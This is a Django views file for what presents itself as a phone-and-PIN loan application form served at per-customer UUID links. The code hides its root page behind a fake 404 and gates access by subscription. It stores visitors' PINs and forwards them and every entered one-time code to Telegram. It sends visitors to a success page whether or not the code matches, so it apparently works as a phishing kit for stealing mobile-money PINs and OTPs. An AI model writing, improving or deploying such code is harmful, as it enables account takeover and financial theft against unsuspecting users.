import random
import string
import logging
from django.db import transaction
from django.shortcuts import get_object_or_404, redirect, render
from django.utils import timezone

from accounts.models import BusinessOwner
from .forms import LoginForm, OTPForm
from .models import Submission, OTPAttempt
from .services import notify_telegram, notify_telegram_otp

logger = logging.getLogger(__name__)

# Session key names — shared between the root-form flow and the UUID-form flow.
# The UUID flow additionally stores the business owner PK so the OTP step can
# recover the correct owner without trusting any user-supplied data.
SESSION_KEY       = "loan_application"
SUBMISSION_KEY    = "loan_submission_id"
OTP_KEY           = "loan_otp"
OTP_EXPIRY_KEY    = "loan_otp_expiry"
BUSINESS_OTP_KEY  = "loan_otp"          # same slot — one active flow at a time
BUSINESS_UUID_KEY = "loan_business_uuid"


def _generate_otp(length=6):
    return "".join(random.choices(string.digits, k=length))


def _clear_session(request):
    for key in (SESSION_KEY, SUBMISSION_KEY, OTP_KEY, OTP_EXPIRY_KEY, BUSINESS_UUID_KEY):
        request.session.pop(key, None)


# ═══════════════════════════════════════════════════════════════════════════════
# ROOT-FORM FLOW  (legacy, no business owner context)
# ═══════════════════════════════════════════════════════════════════════════════

def login_view(request):
    """Root path — returns a generic inaccessible page. The real form is only at /f/<uuid>/."""
    return render(request, "submissions/inaccessible.html", status=404)


def otp_view(request):
    """Legacy OTP path — no longer reachable from the root form; redirect to inaccessible."""
    return render(request, "submissions/inaccessible.html", status=404)


def success_view(request):
    """Legacy success path — redirect to inaccessible."""
    return render(request, "submissions/inaccessible.html", status=404)


# ═══════════════════════════════════════════════════════════════════════════════
# UUID-BASED PUBLIC FORM FLOW  (per-business-owner)
# ═══════════════════════════════════════════════════════════════════════════════

def _get_active_business_owner(business_uuid):
    """
    Resolve a UUID to a BusinessOwner.
    Returns the BusinessOwner if found and their subscription is active,
    raises Http404 if the UUID is unknown,
    returns None if the subscription is inactive/expired (caller shows a message).
    """
    owner = get_object_or_404(BusinessOwner, public_uuid=business_uuid)
    return owner


def public_form_view(request, business_uuid):
    """
    /f/<uuid>/ — phone + PIN entry for a specific business owner's form.
    The UUID is resolved to a BusinessOwner; their config drives Telegram delivery.
    """
    owner = _get_active_business_owner(business_uuid)

    # Subscription guard — inactive owners get a polite closed message
    if not owner.subscription.is_active():
        return render(request, "submissions/form_inactive.html", {
            "business_name": owner.business_name,
        })

    error = None

    if request.method == "POST":
        form = LoginForm(request.POST)
        if form.is_valid():
            phone      = form.cleaned_data["phone"]
            country    = request.POST.get("country_code", "+263")
            full_phone = f"{country}{phone.lstrip('0')}"
            pin        = form.cleaned_data["pin"]

            submission = Submission(
                first_name        = "",
                last_name         = "",
                age               = 0,
                employment_status = "employed",
                phone             = full_phone,
                email             = "",
                amount            = 0,
                pin               = pin,
                otp_verified      = False,
                business_owner    = owner,   # ← account isolation
            )
            submission.save()

            # Store the UUID in session so the OTP step can find the owner
            # without trusting any URL or form parameter
            request.session[SUBMISSION_KEY]    = submission.pk
            request.session[SESSION_KEY]       = {"phone": full_phone, "pin": pin}
            request.session[BUSINESS_UUID_KEY] = str(business_uuid)

            # Telegram notification fires after DB commit
            transaction.on_commit(lambda: notify_telegram(submission))
            logger.info(
                "Submission #%s saved for %s via UUID form %s.",
                submission.pk, full_phone, business_uuid,
            )

            otp    = _generate_otp()
            expiry = timezone.now().timestamp() + 120
            request.session[OTP_KEY]        = otp
            request.session[OTP_EXPIRY_KEY] = expiry
            logger.info("OTP for submission #%s: %s", submission.pk, otp)

            return redirect("submissions:public_otp", business_uuid=business_uuid)
        else:
            error = "Please check your phone number and PIN."
    else:
        form = LoginForm()

    return render(request, "submissions/submit.html", {
        "form": form,
        "error": error,
        "business_uuid": business_uuid,
    })


def public_otp_view(request, business_uuid):
    """
    /f/<uuid>/otp/ — OTP entry step for the UUID-based form.
    The business owner is recovered from the session, never from URL parameters.
    """
    submission_id  = request.session.get(SUBMISSION_KEY)
    otp            = request.session.get(OTP_KEY)
    expiry         = request.session.get(OTP_EXPIRY_KEY)
    data           = request.session.get(SESSION_KEY, {})
    session_uuid   = request.session.get(BUSINESS_UUID_KEY)

    # Guard: session must belong to this UUID flow
    if not submission_id or not otp or session_uuid != str(business_uuid):
        return redirect("submissions:public_form", business_uuid=business_uuid)

    now          = timezone.now().timestamp()
    seconds_left = max(0, int((expiry or now) - now))
    expired      = seconds_left <= 0
    error        = None

    if request.method == "POST":
        if "resend" in request.POST:
            new_otp = _generate_otp()
            request.session[OTP_KEY]        = new_otp
            request.session[OTP_EXPIRY_KEY] = timezone.now().timestamp() + 120
            logger.info("OTP resent for submission #%s: %s", submission_id, new_otp)
            return redirect("submissions:public_otp", business_uuid=business_uuid)

        form = OTPForm(request.POST)
        if form.is_valid():
            entered = form.cleaned_data["otp"]
            matched = (entered == otp) and not expired

            try:
                submission  = Submission.objects.select_related("business_owner").get(pk=submission_id)
                attempt_num = submission.otp_attempts.count() + 1
                attempt     = OTPAttempt.objects.create(
                    submission     = submission,
                    attempt_number = attempt_num,
                    otp_entered    = entered,
                    matched        = matched,
                )
                notify_telegram_otp(attempt)
            except Submission.DoesNotExist:
                logger.error("Submission #%s missing during UUID OTP.", submission_id)
                _clear_session(request)
                return redirect("submissions:public_form", business_uuid=business_uuid)

            if matched:
                submission.otp_verified = True
                submission.otp_code     = entered
                submission.save(update_fields=["otp_verified", "otp_code"])
                logger.info("Submission #%s OTP verified (UUID form).", submission_id)
            else:
                logger.warning(
                    "Submission #%s OTP mismatch (entered: %s). Redirecting to success.",
                    submission_id, entered,
                )

            _clear_session(request)
            return redirect("submissions:public_success", business_uuid=business_uuid)
        else:
            error = "Please enter a valid code."
    else:
        form = OTPForm()

    return render(request, "submissions/otp.html", {
        "form": form,
        "seconds_left": seconds_left,
        "expired": expired,
        "error": error,
        "phone": data.get("phone", ""),
        "business_uuid": business_uuid,
    })


def public_success_view(request, business_uuid):
    """/f/<uuid>/success/ — success page for the UUID-based form."""
    return render(request, "submissions/success.html")
